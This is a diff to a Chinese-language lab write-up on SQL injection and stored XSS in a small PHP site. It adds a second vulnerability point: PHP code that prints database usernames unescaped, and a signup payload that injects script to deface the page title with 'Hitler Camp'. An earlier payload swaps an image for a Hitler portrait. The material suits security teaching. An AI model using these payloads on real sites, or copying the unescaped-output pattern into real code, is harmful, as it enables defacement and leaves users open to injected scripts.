@@ -60,6 +60,8 @@ INSERT INTO users(Alias, email, password) VALUES('htxmb', (select concat(coalesc
 
 ### XSS 漏洞
 
+#### 漏洞点 1
+
 在登录之后会显示一个查询页面，将查询的信息显示在底下的 Query Result 搜索栏中：
 
 - 实现这一过程的 `php` 代码大致如下（文件 `index.php`）：
@@ -136,7 +138,54 @@ hacker', '<script>ele = document.getElementsByName("query-image");
 ele[0].childNodes[1].src = "https://upload.wikimedia.org/wikipedia/commons/e/e1/Hitler_portrait_crop.jpg";</script>', '68e109f0f40ca72a15e05cc22786f8e6'); #
 ```
 
-再次登录发现左侧页面 `img` 被篡改为希特勒的照片：
+正常的页面显示如下：
 
-![1542652627367](./xss-1.png)
+![1542699400165](./xss-normal-1.png)
+
+当查询用户名为 `hacker` 的信息时，左侧页面 `img` 被篡改为希特勒的照片：
+
+![1542699513631](./xss-hack-1.png)
+
+#### 漏洞点 2
+
+注意到在网站的最后页面 `#CONTACT` 会显示用户的用户名信息，显示效果如下：
+
+![1542700523486](./register-msg.png)
+
+它的实现 `PHP` 代码如下：
+
+```php+HTML
+<span class='btn-block'>Register people:</span>
+<div class="btn-group" role="group" aria-label="Basic example">
+    <?php
+    $conn = new mysqli("localhost", "root", "root");
+    $conn->query("USE playermansystem;");
+    if($res = $conn->query("select Alias from users"))
+        while($row = $res->fetch_assoc())
+            echo "<button type='button' class='btn btn-secondary'>".$row["Alias"]."</button>";
+    ?>
+</div>
+```
+
+同样是从数据库中查询用户名，直接将用户名信息置于屏幕上，根据前面的观察，我们知道，用户名中可以直接插入 `javascript` 代码。
+
+
+
+我们尝试以下的 `javascript` 代码，可以更改网页的标题内容：
+
+```javascript
+ele = document.getElementsByName("head-title");
+ele[0].innerHTML = "Welcome to <span class='brand'>Hitler Camp</span>";
+```
+
+因此可以通过以下的 `payload` 注册一个新账户：
+
+```mysql
+# _POST["signup-username"]=
+hacker<script>ele = document.getElementsByName("head-title"); ele[0].innerHTML= "Welcome to <span class=\'brand\'>Hitler Camp</span>";</script>', 'hacker@qq.com', '68e109f0f40ca72a15e05cc22786f8e6'); #
+```
+
+发现网页的标题被篡改：
+
+![1542702097204](./xss-hack-2.png)
 
